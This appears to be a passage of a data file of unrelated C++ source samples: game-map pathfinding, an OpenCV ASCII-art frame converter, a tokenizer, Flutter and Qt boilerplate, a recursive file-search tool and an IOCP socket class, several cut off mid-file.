visitedDelivery.insert({u, v});\n                        }\n                    }\n                }\n                m_deliveryBlock.push_back(deliveryBlock);\n            }\n        }\n    }\n\n    m_deliveryBlockGlobalDepth.resize(m_deliveryBlock.size());\n}\n\nvoid MapFunction::initDeliveryDepth(GlobalData& globalData, int left, int right){\n\n    int n = m_map.size(), m = m_map[0].size();\n\n    struct Node {\n        int x, y, dir;\n        Node(int _x, int _y, int _dir): x(_x), y(_y), dir(_dir) {\n\n        }\n    };\n\n    for(int i = left; i < right; i++){\n        auto& deliveryBlock = m_deliveryBlock[i];\n        auto& globalDepth = m_deliveryBlockGlobalDepth[i];\n        globalDepth = vector<vector<vector<int>>>(n, vector<vector<int>>(m, vector<int>(4, INF)));\n        queue<Node> que;\n        for(auto& delivery : deliveryBlock){\n            for(int j = 0; j < 4; j++){\n                que.push({delivery.first, delivery.second, j});\n                // \u5f97\u5224\u65ad\u662f\u4e0d\u662f\u5408\u6cd5\u5750\u6807\n                if (checkBoatCanMoveOn(delivery.first, delivery.second, j)) {\n                    globalDepth[delivery.first][delivery.second][j] = 0;\n                }\n            }\n        }\n\n        while (!que.empty()) {\n            auto node = que.front();\n            que.pop();\n            // \u9006\u8fd0\u7b97, \u6a21\u62df\u4e09\u79cd\u64cd\u4f5c\n            int currentDepth = globalDepth[node.x][node.y][node.dir];\n            vector<vector<int>> tmp;\n            // 1. \u5047\u5982\u662f\u524d\u8fdb\u6765\u6b64?\n            tmp.push_back(getInvShip(node.x, node.y, node.dir));\n            // 2. \u5047\u5982\u662f\u987a\u65f6\u9488\u65cb\u8f6c\u6765\u6b64?\n            tmp.push_back(getInvClockwise(node.x, node.y, node.dir));\n            // 3. \u5047\u5982\u662f\u9006\u65f6\u9488\u65cb\u8f6c\u6765\u6b64?\n            tmp.push_back(getInvAnticlockwise(node.x, node.y, node.dir));\n            for (auto& boat : tmp) {\n                if (checkBoatCanMoveOn(boat[0], boat[1], boat[2])) {\n                    int cost = isOnMainChannel(node.x, node.y, node.dir) ? 2 : 1;\n                    if (currentDepth + cost < globalDepth[boat[0]][boat[1]][boat[2]] && currentDepth + cost <= maxBoat2DeliveryDistance) {\n                        que.push(Node(boat[0], boat[1], boat[2]));\n                        globalDepth[boat[0]][boat[1]][boat[2]] = currentDepth + cost;\n                    }\n                }\n            }\n        }\n    }\n}\n\nvoid MapFunction::initBerth(GlobalData& globalData){\n    DECLARE_VARIABLES(frameID, money, berths, robots, boats, goods, goodsLeftPtr, privateRobots, privateBoats, askedRobots, globalData)\n\n    int n = m_map.size(), m = m_map[0].size();\n    int numOfBerths = berths.size();\n\n    // 1. \u8ba1\u7b97\u6cca\u4f4d\u533a\u4e0e\u9760\u6cca\u533a\n    m_pos2Berth.clear();\n    m_pos2NearBerth.clear();\n    for (int berthID = 0; berthID < numOfBerths; ++berthID) {\n        auto& berth = berths[berthID];\n        set<pair<int, int>> vi",
    "#include <opencv2/opencv.hpp>\n#include <iostream>\n#include <fstream>\n#include <vector>\n#include <thread>\n#include <filesystem>\n#include <map>\n#include <mutex>\n#include <string>\n#include <cmath>\n#include <iomanip>\n#include <limits>\n#include <chrono>\n\nnamespace fs = std::filesystem;\nstd::mutex io_mutex;\n\nstd::string formatNumber(int num, int length)\n{\n    std::ostringstream oss;\n    oss << std::setw(length) << std::setfill('0') << num;\n    return oss.str();\n}\n\nstd::map<char, cv::Mat> load_font_images(const std::string &font_dir)\n{\n    std::map<char, cv::Mat> font_images;\n    for (const auto &entry : fs::directory_iterator(font_dir))\n    {\n        if (entry.path().extension() == \".png\")\n        {\n            std::string filename = entry.path().stem().string();\n            int char_code;\n            try\n            {\n                char_code = std::stoi(filename);\n            }\n            catch (const std::invalid_argument &ia)\n            {\n                std::cerr << \"Invalid argument: \" << ia.what() << '\\n';\n                continue;\n            }\n            catch (const std::out_of_range &oor)\n            {\n                std::cerr << \"Out of Range error: \" << oor.what() << '\\n';\n                continue;\n            }\n\n            if (char_code < 0 || char_code > 255)\n            {\n                std::cerr << \"Character code out of valid range: \" << char_code << '\\n';\n                continue;\n            }\n\n            char char_code_char = static_cast<char>(char_code);\n            cv::Mat img = cv::imread(entry.path(), cv::IMREAD_GRAYSCALE);\n            if (img.empty())\n            {\n                std::cerr << \"Failed to load image for char code \" << char_code_char << \" at path \" << entry.path() << std::endl;\n                continue;\n            }\n\n            font_images[char_code_char] = img;\n        }\n    }\n    return font_images;\n}\n\nstd::pair<char, cv::Mat> compare_matrices(const cv::Mat &segment, const std::map<char, cv::Mat> &font_images)\n{\n    double min_distance = std::numeric_limits<double>::max();\n    char best_match_char = 0;\n    cv::Mat best_match_img;\n\n    for (const auto &[char_code, font_image] : font_images)\n    {\n        if (!segment.empty() && !font_image.empty() && segment.type() == font_image.type() && segment.size() == font_image.size())\n        {\n            cv::Mat font_image_inv;\n            cv::bitwise_not(font_image, font_image_inv); // For some reason, the images need to be inverted for the comparison to work\n            cv::bitwise_not(segment, segment);           // Same thing here\n\n            double distance = cv::norm(segment, font_image_inv, cv::NORM_L2);\n\n            if (distance < min_distance)\n            {\n                min_distance = distance;\n                best_match_char = char_code;\n                best_match_img = font_image;\n            }\n        }\n        else\n        {\n            std::cerr << \"Incompatible or empty images for char \" << char_code << std::endl;\n        }\n    }\n    if (best_match_char <= 0 || best_match_char > 127)\n    {\n        std::cerr << \"Invalid character match detected, using default.\" << std::endl;\n        best_match_char = '?'; // Default character if no valid match found\n    }\n    return {best_match_char, best_match_img};\n}\n\nvoid process_frame(const cv::Mat &frame, int count, const std::map<char, cv::Mat> &font_images, int font_size, const std::string &output_img_dir, const std::string &output_txt_dir)\n{\n    cv::Mat gray_frame;\n    cvtColor(frame, gray_frame, cv::COLOR_BGR2GRAY);\n\n    cv::Mat output_image = cv::Mat::zeros(gray_frame.size(), gray_frame.type());\n    std::vector<std::string> characters_grid;\n\n    for (int j = 0; j <= gray_frame.rows - font_size; j += font_size)\n    {\n        std::string row_chars;\n        for (int i = 0; i <= gray_frame.cols - font_size; i += font_size)\n        {\n            cv::Rect region(i, j, font_size, font_size);\n            cv::Mat segment = gray_frame(region);\n\n            auto [best_match_char, best_match_img] = compare_matrices(segment, font_images);\n            cv::Mat destination = output_image(cv::Rect(i, j, font_size, font_size));\n            best_match_img.copyTo(destination);\n            row_chars += best_match_char;\n        }\n        characters_grid.push_back(row_chars);\n    }\n\n    std::string frame_filename = output_img_dir + \"/frame_\" + formatNumber(count, 10) + \".png\";\n    std::string text_filename = output_txt_dir + \"/frame_\" + formatNumber(count, 10) + \".txt\";\n\n    bool isWritten = cv::imwrite(frame_filename, output_image);\n    if (!isWritten)\n    {\n        std::cerr << \"Failed to write image to \" << frame_filename << std::endl;\n    }\n\n    std::ofstream file(text_filename);\n    if (!file)\n    {\n        std::cerr << \"Failed to open text file \" << text_filename << std::endl;\n    }\n    else\n    {\n        for (const auto &row : characters_grid)\n        {\n            file << row << '\\n';\n        }\n    }\n\n    std::lock_guard<std::mutex> guard(io_mutex);\n}\n\nint main(int argc, ch",
    "#undef NDEBUG\r\n#include <iostream>\r\n#include <cassert>\r\n#include <fstream>\r\n#include <cstdint>\r\n#include <cstdlib>\r\n#include <vector>\r\n\r\ninline static char* findFirst(char* str, char c)\r\n{\r\n\tchar* _c = str;\r\n\tfor (; *_c != '\\0'; _c++)\r\n\t\tif (*_c == c) return _c;\r\n\treturn _c;\r\n}\r\n\r\ninline static char* findFirst(char* str, const char* chars)\r\n{\r\n\tchar* _c = str;\r\n\tfor (; *_c != '\\0'; _c++)\r\n\t\tfor (const char* c = chars; *c != '\\0'; c++)\r\n\t\t\tif (*_c == *c) return _c;\r\n\treturn _c;\r\n}\r\n\r\ninline static char* findFirstNot(char* str, const char* chars)\r\n{\r\n\tchar* _c = str;\r\n\tfor (; *_c != '\\0'; _c++)\r\n\t\tfor (const char* c = chars; *c != '\\0'; c++)\r\n\t\t\tif (*_c != *c) return _c;\r\n\treturn _c;\r\n}\r\n\r\ninline static char* findFirst(char* str, int f(int))\r\n{\r\n\tchar* _c = str;\r\n\tfor (; *_c != '\\0'; _c++)\r\n\t\tif (f(*_c)) return _c;\r\n\treturn _c;\r\n}\r\n\r\ninline static char* findFirstNot(char* str, int f(int))\r\n{\r\n\tchar* _c = str;\r\n\tfor (; *_c != '\\0'; _c++)\r\n\t\tif (!f(*_c)) return _c;\r\n\treturn _c;\r\n}\r\n\r\n#pragma pack(2)\r\nstruct String\r\n{\r\n\tchar* start;\r\n\tuint16_t length;\r\n\r\n\ttemplate <typename T>\r\n\tinline T applyAsNormalString(T f(const char*)) const\r\n\t{\r\n\t\tchar ei = start[length];\r\n\t\tstart[length] = '\\0';\r\n\t\tT v = f(start);\r\n\t\tstart[length] = ei;\r\n\t\treturn v;\r\n\t}\r\n\r\n\tinline void print() const\r\n\t{\r\n\t\tfor (uint16_t i = 0; i < length; i++)\r\n\t\t\tputchar(start[i]);\r\n\t}\r\n\r\n\tinline long long toInt() const\r\n\t{\r\n\t\treturn applyAsNormalString(atoll);\r\n\t}\r\n\r\n\tinline double toDouble() const\r\n\t{\r\n\t\treturn applyAsNormalString(atof);\r\n\t}\r\n};\r\n\r\ninline static void todo(const char* str)\r\n{\r\n\tstd::cout << \"TODO: \" << str;\r\n\tabort();\r\n}\r\n\r\nnamespace tokenKinds\r\n{\r\n\tconstexpr uint8_t\r\n\t\tnumber = 0,\r\n\t\talpha = 1,\r\n\t\tsolo = 2,\r\n\t\tstring = 3;\r\n\r\n\tconst char* names[] = {\r\n\t\t\"number\",\r\n\t\t\"alpha\",\r\n\t\t\"solo\",\r\n\t\t\"\\033[32mstring\"\r\n\t};\r\n}\r\n\r\nstruct Token\r\n{\r\n\tString str;\r\n\tuint8_t kind;\r\n\r\n\tinline void print() const\r\n\t{\r\n\t\tstd::cout << tokenKinds::names[kind] << \"\\033[0m\\t'\\033[36m\";\r\n\r\n\t\tstr.print();\r\n\r\n\t\tstd::cout << \"\\033[0m'\\n\";\r\n\t}\r\n};\r\n\r\nint main()\r\n{\r\n\tstd::vector<Token> tokens;\r\n\r\n\tstd::ifstream file(\"test.jiw\");\r\n\tassert(file.is_open());\r\n\r\n\tfile.seekg(0, std::ios::end);\r\n\tsize_t fileSize = file.tellg();\r\n\tfile.seekg(0, std::ios::beg);\r\n\r\n\tchar* buffer = (char*)malloc(fileSize);\r\n\tassert(buffer != nullptr);\r\n\r\n\tfile.read(buffer, fileSize);\r\n\tfile.close();\r\n\r\n\tuint8_t kind;\r\n\tchar* end = nullptr;\r\n\tfor (char* c = buffer; *c != '\\0';)\r\n\t{\r\n\t\tif (isspace(*c))\r\n\t\t{\r\n\t\t\tc++;\r\n\t\t\tcontinue;\r\n\t\t}\r\n\t\telse if (isdigit(*c))\r\n\t\t{\r\n\t\t\tend = findFirstNot(c + 1, isdigit);\r\n\t\t\tkind = tokenKinds::number;\r\n\t\t}\r\n\t\telse if (isalpha(*c))\r\n\t\t{\r\n\t\t\tend = findFirstNot(c + 1, isalnum);\r\n\t\t\tkind = tokenKinds::alpha;\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\tif (*c == '/')\r\n\t\t\t{\r\n\t\t\t\tif (c[1] == '/')\r\n\t\t\t\t{\r\n\t\t\t\t\tc = findFirst(c + 2, '\\n') + 1;\r\n\t\t\t\t\tcontinue;\r\n\t\t\t\t}\r\n\t\t\t\telse if (c[1] == '*')\r\n\t\t\t\t{\r\n\t\t\t\t\tc++;\r\n\t\t\t\t\twhile (true)\r\n\t\t\t\t\t{\r\n\t\t\t\t\t\tc = findFirst(c + 1, '*');\r\n\t\t\t\t\t\tif (c[1] == '/')\r\n\t\t\t\t\t\t\tbreak;\r\n\t\t\t\t\t}\r\n\t\t\t\t\tc += 2;\r\n\t\t\t\t\tcontinue;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\r\n\t\t\ttokens.push_back({ { c, 1 }, tokenKinds::solo });\r\n\r\n\t\t\tif (*c == '\"')\r\n\t\t\t{\r\n\t\t\t\tend = findFirst(++c, '\"');\r\n\t\t\t\ttokens.push_back({ { c, static_cast<uint16_t>(end - c) }, tokenKinds::string });\r\n\t\t\t\ttokens.push_back({ { c = end, 1 }, tokenKinds::solo });\r\n\t\t\t}\r\n\r\n\t\t\tc++;\r\n\t\t\tcontinue;\r\n\t\t}\r\n\r\n\t\ttokens.push_back({ { c, static_cast<uint16_t>(end - c) }, kind });\r\n\t\tc = end;\r\n\t}\r\n\r\n\tfor (Token& token : tokens)\r\n\t{\r\n\t\ttoken.print();\r\n\t}\r\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"weather_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/****************************************************************************\n** Meta object code from reading C++ file 'resultonbarbie.h'\n**\n** Created by: The Qt Meta Object Compiler version 68 (Qt 6.6.2)\n**\n** WARNING! All changes made in this file will be lost!\n*****************************************************************************/\n\n#include \"../../../BarbieProject/resultonbarbie.h\"\n#include <QtCore/qmetatype.h>\n\n#if __has_include(<QtCore/qtmochelpers.h>)\n#include <QtCore/qtmochelpers.h>\n#else\nQT_BEGIN_MOC_NAMESPACE\n#endif\n\n\n#include <memory>\n\n#if !defined(Q_MOC_OUTPUT_REVISION)\n#error \"The header file 'resultonbarbie.h' doesn't include <QObject>.\"\n#elif Q_MOC_OUTPUT_REVISION != 68\n#error \"This file was generated using the moc from 6.6.2. It\"\n#error \"cannot be used with the include files from this version of Qt.\"\n#error \"(The moc has changed too much.)\"\n#endif\n\n#ifndef Q_CONSTINIT\n#define Q_CONSTINIT\n#endif\n\nQT_WARNING_PUSH\nQT_WARNING_DISABLE_DEPRECATED\nQT_WARNING_DISABLE_GCC(\"-Wuseless-cast\")\nnamespace {\n\n#ifdef QT_MOC_HAS_STRINGDATA\nstruct qt_meta_stringdata_CLASSresultOnBarbieENDCLASS_t {};\nconstexpr auto qt_meta_stringdata_CLASSresultOnBarbieENDCLASS = QtMocHelpers::stringData(\n    \"resultOnBarbie\"\n);\n#else  // !QT_MOC_HAS_STRING_DATA\nstruct qt_meta_stringdata_CLASSresultOnBarbieENDCLASS_t {\n    uint offsetsAndSizes[2];\n    char stringdata0[15];\n};\n#define QT_MOC_LITERAL(ofs, len) \\\n    uint(sizeof(qt_meta_stringdata_CLASSresultOnBarbieENDCLASS_t::offsetsAndSizes) + ofs), len \nQ_CONSTINIT static const qt_meta_stringdata_CLASSresultOnBarbieENDCLASS_t qt_meta_stringdata_CLASSresultOnBarbieENDCLASS = {\n    {\n        QT_MOC_LITERAL(0, 14)   // \"resultOnBarbie\"\n    },\n    \"resultOnBarbie\"\n};\n#undef QT_MOC_LITERAL\n#endif // !QT_MOC_HAS_STRING_DATA\n} // unnamed namespace\n\nQ_CONSTINIT static const uint qt_meta_data_CLASSresultOnBarbieENDCLASS[] = {\n\n // content:\n      12,       // revision\n       0,       // classname\n       0,    0, // classinfo\n       0,    0, // methods\n       0,    0, // properties\n       0,    0, // enums/sets\n       0,    0, // constructors\n       0,       // flags\n       0,       // signalCount\n\n       0        // eod\n};\n\nQ_CONSTINIT const QMetaObject resultOnBarbie::staticMetaObject = { {\n    QMetaObject::SuperData::link<QWidget::staticMetaObject>(),\n    qt_meta_stringdata_CLASSresultOnBarbieENDCLASS.offsetsAndSizes,\n    qt_meta_data_CLASSresultOnBarbieENDCLASS,\n    qt_static_metacall,\n    nullptr,\n    qt_incomplete_metaTypeArray<qt_meta_stringdata_CLASSresultOnBarbieENDCLASS_t,\n        // Q_OBJECT / Q_GADGET\n        QtPrivate::TypeAndForceComplete<resultOnBarbie, std::true_type>\n    >,\n    nullptr\n} };\n\nvoid resultOnBarbie::qt_static_metacall(QObject *_o, QMetaObject::Call _c, int _id, void **_a)\n{\n    (void)_o;\n    (void)_id;\n    (void)_c;\n    (void)_a;\n}\n\nconst QMetaObject *resultOnBarbie::metaObject() const\n{\n    return QObject::d_ptr->metaObject ? QObject::d_ptr->dynamicMetaObject() : &staticMetaObject;\n}\n\nvoid *resultOnBarbie::qt_metacast(const char *_clname)\n{\n    if (!_clname) return nullptr;\n    if (!strcmp(_clname, qt_meta_stringdata_CLASSresultOnBarbieENDCLASS.stringdata0))\n        return static_cast<void*>(this);\n    return QWidget::qt_metacast(_clname);\n}\n\nint resultOnBarbie::qt_metacall(QMetaObject::Call _c, int _id, void **_a)\n{\n    _id = QWidget::qt_metacall(_c, _id, _a);\n    return _id;\n}\nQT_WARNING_POP\n",
    "#include <iostream>\n#include <string>\n#include <filesystem>\n#include <vector>\n#include <thread>\n#include <chrono>\n#include <ctime>\nusing namespace std;\nint num = 0;\nbool active = true;\nstring sword = \"your file\";\nstring path = \"your searching path\";\nfloat timeout = 666.0;\nvector<string> exceptions = {\"sys\", \".speech-dispatcher\", \".wine\", \"llvm-14\", \"proc\", \"X11\", \"steam\", \"z:\"};\nvector<string> results;\nvoid checker(){\n    float timet = 0;\n    while(active){\n        this_thread::sleep_for(0.1s);\n        timet += 0.1;\n        if(timet >= timeout){\n            active = false;\n            break;\n        }\n    }\n}\nstring mlower(string str){\n    for(char & stabe : str){\n        stabe = tolower(stabe);\n    }\n    return str;\n}\nbool check_it(string inp, vector<string> inplist){\n    bool h = true;\n    for(string element : inplist){\n        if(mlower(element) == mlower(inp)){\n            return false;\n            h = false;\n            break;\n        }\n    }\n    if(h){return true;}\n}\nvector<string> split_str(string tos, char del){\n    vector<string> re;\n    string h;\n    for(auto& stabe : tos){\n        if(stabe != del){\n        h = h + stabe;}\n        else if(stabe == del){\n            re.push_back(h);\n            h = \"\";\n        }\n    }\n    if(tos[tos.size()] != del){\n        re.push_back(h);\n    }\n    return re;\n}\nstring wend(string str){\n    vector<string> sstr = split_str(str, '.');\n    return sstr[0];\n}\nvoid search_folder(string folder){\n    if(active){\n        try{\n    vector<string> files;\n    vector<string> folders;\n    for (const auto & entry : filesystem::directory_iterator(folder))\n        if(filesystem::is_regular_file(entry)){\n             files.push_back(entry.path().c_str());\n        }\n        else if(filesystem::is_directory(entry)){\n             folders.push_back(entry.path().c_str());\n        }     \n    for(string fpath : files){\n        vector<string> filename  = split_str(fpath, '/');\n        if(mlower(wend(filename[filename.size()-1])) == mlower(wend(sword))){\n            results.push_back(fpath);\n        }\n        num++;\n    }\n    for(string folder : folders){\n        vector<string> foldername = split_str(folder, '/');\n        if(mlower(foldername[foldername.size()-1]) == mlower(wend(sword))){\n            results.push_back(folder);\n            cout<<folder<<endl;}   \n        if(check_it(foldername[foldername.size()-1], exceptions)){\n        search_folder(folder);}\n        cout<<\"\\033[1;35m\"+folder+\"\\033[0m\"<<endl;\n    } }\n    catch(...){\n        ;\n    }}\n}\nint main(){\n    time_t start = time(nullptr);\n    thread t1 = thread(checker);\n    t1.detach();\n    thread t2 = thread(search_folder, path);\n    t2.join();\n    active = false;\n    cout<<\"\\n\\n\\n\\033[1;31mResults:\\033[0m\\n\";\n    for(const string element: results){\n        cout<<\"\\033[1;32m    \"+element+\"\\033[0m\"<<endl;\n    }\n    cout<<\"\\n\";\n    cout<<\"\\033[1;31mEnded searching \"+to_string(num)+\" files \"+to_string(time(nullptr)-start)+\"secs\\033[0m\\n\";\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"messenger_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "// IOCPSocket2.cpp: implementation of the CIOCPSocket2 class.\n//\n//////////////////////////////////////////////////////////////////////\n\n#include \"stdafx.h\"\n#include \"IOCPSocket2.h\"\n#include \"CircularBuffer.h\"\n\n\nCIOCPSocket2::CIOCPSocket2()\n{\n\tm_pBuffer = new CCircularBuffer(SOCKET_BUFF_SIZE);\n\tm_Socket = INVALID_SOCKET;\n\n\tm_pIOCPort = NULL;\n\tm_Type = TYPE_ACCEPT;\n}\n\nCIOCPSocket2::~CIOCPSocket2()\n{\n\tdelete m_pBuffer;\n}\n\n\nBOOL CIOCPSocket2::Create( UINT nSocketPort, int nSocketType, long lEvent, LPCTSTR lpszSocketAddress)\n{\n\tint ret;\n\n\tm_Socket = socket( AF_INET, nSocketType/*SOCK_STREAM*/, 0 );\n\tif( m_Socket == INVALID_SOCKET ) {\n\t\tret = WSAGetLastError();\n\t\tTRACE(\"Socket Create Fail! - %d\\n\", ret);\n\t\treturn FALSE;\n\t}\n\n\tm_hSockEvent = WSACreateEvent();\n\tif( m_hSockEvent == WSA_INVALID_EVENT ) {\n\t\tret = WSAGetLastError();\n\t\tTRACE(\"Event Create Fail! - %d\\n\", ret);\n\t\treturn FALSE;\n\t}\n\n\treturn TRUE;\n}\n\nBOOL CIOCPSocket2::Connect( CIOCPort* pIocp, LPCTSTR lpszHostAddress, UINT nHostPort )\n{\n\tstruct sockaddr_in addr;\n\n\tmemset((void *)&addr, 0, sizeof(addr));\n\taddr.sin_family = AF_INET;\n\taddr.sin_addr.s_addr = inet_addr(lpszHostAddress);\n\taddr.sin_port = htons(nHostPort);\n\n\tint result = connect( m_Socket,(struct sockaddr *)&addr,sizeof(addr) );\n\tif ( result == SOCKET_ERROR )\n\t{\n\t\tint err = WSAGetLastError();\n//\t\tTRACE(\"CONNECT FAIL : %d\\n\", err);\n\t\tclosesocket( m_Socket );\n\t\treturn FALSE;\n\t}\n\n\tASSERT( pIocp );\n\n\tInitSocket( pIocp );\n\n\tm_Sid = m_pIOCPort->GetClientSid();\n\tif( m_Sid < 0 )\n\t\treturn FALSE;\n\n\tm_pIOCPort->m_ClientSockArray[m_Sid] = this;\n\t\n\tif ( !m_pIOCPort->Associate(this, m_pIOCPort->m_hClientIOCPort) )\n\t{\n\t\tTRACE(\"Socket Connecting Fail - Associate\\n\");\n\t\treturn FALSE;\n\t}\n\n\tm_ConnectAddress = lpszHostAddress;\n\tm_State = STATE_CONNECTED;\n\tm_Type = TYPE_CONNECT;\n\n\tReceive();\n\n\treturn TRUE;\n}\n\nint CIOCPSocket2::Send(char *pBuf, long length, int dwFlag)\n{\n\tint ret_value = 0;\n\tWSABUF out;\n\tDWORD sent = 0;\n\tOVERLAPPED *pOvl;\n\tHANDLE\thComport = NULL;\n\n\tif( length > MAX_PACKET_SIZE )\n\t\treturn 0;\n\n\tchar pTBuf[MAX_PACKET_SIZE];\n\tmemset( pTBuf, 0x00, MAX_PACKET_SIZE );\n\tint index = 0;\n\n\tpTBuf[index++] = (BYTE)PACKET_START1;\n\tpTBuf[index++] = (BYTE)PACKET_START2;\n\tmemcpy( pTBuf+index, &length, 2 );\n\tindex += 2;\n\tmemcpy( pTBuf+index, pBuf, length );\n\tindex += length;\n\tpTBuf[index++] = (BYTE)PACKET_END1;\n\tpTBuf[index++] = (BYTE)PACKET_END2;\n\n\tout.buf = pTBuf;\n\tout.len = index;\n\t\n\tpOvl = &m_SendOverlapped;\n\tpOvl->Offset = OVL_SEND;\n\tpOvl->OffsetHigh = out.len;\n\n\tret_value = WSASend( m_Socket, &out, 1, &sent, dwFlag, pOvl, NULL);\n\t//if( sent > 100 )\n\t//\tTRACE(\"Send %d BYtes\\n\", sent);\n\t\n\tif ( ret_value == SOCKET_ERROR )\n\t{\n\t\tint last_err;\n\t\tlast_err = WSAGetLastError();\n\n\t\tif ( last_err == WSA_IO_PENDING ) {\n\t\t\tTRACE(\"SEND : IO_PENDING[SID=%d]\\n\", m_Sid);\n\t\t\tm_nPending++;\n#ifdef __SAMMA\n\t\t\tif( m_nPending > 3 )\n\t\t\t\tgoto close_routine;\n#endif\n\t\t\tsent = length; \n\t\t}\n\t\telse if ( last_err == WSAEWOULDBLOCK )\n\t\t{\n\t\t\tTRACE(\"SEND : WOULDBLOCK[SID=%d]\\n\", m_Sid);\n\n\t\t\tm_nWouldblock++;\n\t\t\tif( m_nWouldblock > 3 )\n\t\t\t\tgoto close_routine;\n\t\t\treturn 0;\n\t\t}\n\t\telse\n\t\t{\n\t\t\tTRACE(\"SEND : ERROR [SID=%d] - %d\\n\", m_Sid, last_err);\n\t\t\tm_nSocketErr++;\n\t\t\tgoto close_routine;\n\t\t}\n\t}\n\telse if ( !ret_value )\n\t{\n\t\tm_nPending = 0;\n\t\tm_nWouldblock = 0;\n\t\tm_nSocketErr = 0;\n\t}\n\n\treturn sent;\n\nclose_routine:\n\tpOvl = &m_RecvOverlapped;\n\tpOvl->Offset = OVL_CLOSE;\n\t\n\tif( m_Type == TYPE_ACCEPT )\n\t\thComport = m_pIOCPort->m_hServerIOCPort;\n\telse\n\t\thComport = m_pIOCPort->m_hClientIOCPort;\n\t\n\tPostQueuedCompletionStatus( hComport, (DWORD)0, (DWORD)m_Sid, pOvl );\n\t\n\treturn -1;\n}\n\nint CIOCPSocket2::Receive()\n{\n\tint RetValue;\n\tWSABUF in;\n\tDWORD insize, dwFlag=0;\n\tOVERLAPPED *pOvl;\n\tHANDLE\thComport = NULL;\n\n\tmemset(m_pRecvBuff, NULL, MAX_PACKET_SIZE );\n\tin.len = MAX_PACKET_SIZE;\n\tin.buf = m_pRecvBuff;\n\n\tpOvl = &m_RecvOverlapped;\n\tpOvl->Offset = OVL_RECEIVE;\n\n\tRetValue = WSARecv( m_Socket, &in, 1, &insize, &dwFlag, pOvl, NULL );\n\n \tif ( RetValue == SOCKET_ERROR )\n\t{\n\t\tint last_err;\n\t\tlast_err = WSAGetLastError();\n\n\t\tif ( last_err == WSA_IO_PENDING ) {\n//\t\t\tTRACE(\"RECV : IO_PENDING[SID=%d]\\n\", m_Sid);\n//\t\t\tm_nPending++;\n//\t\t\tif( m_nPending > 3 )\n//\t\t\t\tgoto close_routine;\n\t\t\treturn 0;\n\t\t}\n\t\telse if ( last_err == WSAEWOULDBLOCK )\n\t\t{\n\t\t\tTRACE(\"RECV : WOULDBLOCK[SID=%d]\\n\", m_Sid);\n\n\t\t\tm_nWouldblock++;\n\t\t\tif( m_nWouldblock > 3 )\n\t\t\t\tgoto close_routine;\n\t\t\treturn 0;\n\t\t}\n\t\telse\n\t\t{\n\t\t\tTRACE(\"RECV : ERROR [SID=%d] - %d\\n\", m_Sid, last_err);\n\n\t\t\tm_nSocketErr++;\n\t\t\tif( m_nSocketErr == 2 )\n\t\t\t\tgoto close_routine;\n\t\t\treturn -1;\n\t\t}\n\t}\n\n\treturn (int)insize;\n\nclose_routine:\n\tpOvl = &m_RecvOverlapped;\n\tpOvl->Offset = OVL_CLOSE;\n\t\n\tif( m_Type == TYPE_ACCEPT )\n\t\thComport = m_pIOCPort->m_hServerIOCPort;\n\telse\n\t\thComport = m_pIOCPort->m_hClientIOCPort;\n\t\n\tPostQueuedCompletionStatus( hComport, (DWORD)0, (DWORD)m_Sid, pOvl );\n\t\n\treturn -1;\n}\n\nvoid CIOCPSocket2::ReceivedData(int length)\n{\n\tif(!length) return;\n\n\tint len = 0;\n\n\tif( !strlen(m_pRecvBuff) )\t\t// \ud328\ud0b7\uae38\uc774\ub294 \uc874\uc7ac\ud558\ub098 \uc2e4 \ub370\uc774\ud130\uac00 \uc5c6\ub294 \uacbd\uc6b0\uac00 ",
